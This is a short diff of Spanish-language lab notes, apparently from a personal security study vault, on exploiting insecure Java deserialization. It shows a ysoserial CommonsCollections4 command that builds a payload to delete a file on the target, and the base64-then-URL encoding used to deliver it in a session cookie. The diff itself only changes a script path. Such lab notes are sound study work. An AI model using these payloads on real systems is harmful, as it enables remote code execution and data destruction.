@@ -25,7 +25,7 @@ ysoserial arma la cadena de gadgets que abusa la lib **Apache Commons Collection
 java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
 ```
 
-> En JDK ≥ 16 hacen falta los `--add-opens`. En el vault: [`JAVA/serialize_payload.py`](vulnerabilities/013-insecure_deserialization/JAVA/serialize_payload.py) los agrega solo y aplica el pipeline `base64,url`.
+> En JDK ≥ 16 hacen falta los `--add-opens`. En el vault: [`scripts/JAVA/serialize_payload.py`](vulnerabilities/013-insecure_deserialization/scripts/JAVA/serialize_payload.py) los agrega solo y aplica el pipeline `base64,url`.
 
 ## El pipeline de codificación (lo importante)
 > `bytes ysoserial` **⟶** ==`base64`== **⟶** ==`url-encode`== **⟶** valor de la cookie `session`
